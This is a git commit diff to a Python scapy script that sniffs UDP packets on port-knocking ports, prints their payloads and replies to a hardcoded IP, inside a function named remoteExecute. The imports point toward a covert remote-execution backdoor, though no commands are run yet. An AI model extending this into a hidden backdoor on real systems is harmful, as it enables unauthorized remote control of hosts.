e3a3dcb3458f49300b3d7bff4a859509ea64ac55
Geoff Dabu <geoffdabu@geoffs-MacBook-Pro.local>
2015-10-13 00:44:27 -0700

    sending payload

--- server1.py
+++ server1.py
@@ -4,14 +4,18 @@ import sys, os, argparse, socket, subprocess, setproctitle, logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
-knock = [2000,2001,2002]
-count = 0
+KNOCK = [1000, 2000, 3000]
+FILTER = "udp and (dst port {0} or {1} or {2} or 80)".format(KNOCK[0], KNOCK[1], KNOCK[2])
+
 
 def remoteExecute(pkt):
-    
+    print pkt['Raw'].load
+
+    pkt = IP(dst="192.168.0.15")/UDP(dport=pkt['UDP'].sport,sport=pkt['UDP'].dport)/'yyyy'
+    send(pkt)
 
 def main():
-    sniff(filter="ip and tcp", prn=remoteExecute)
+    sniff(filter=FILTER, prn=remoteExecute)
 
 if __name__ == '__main__':
     try:
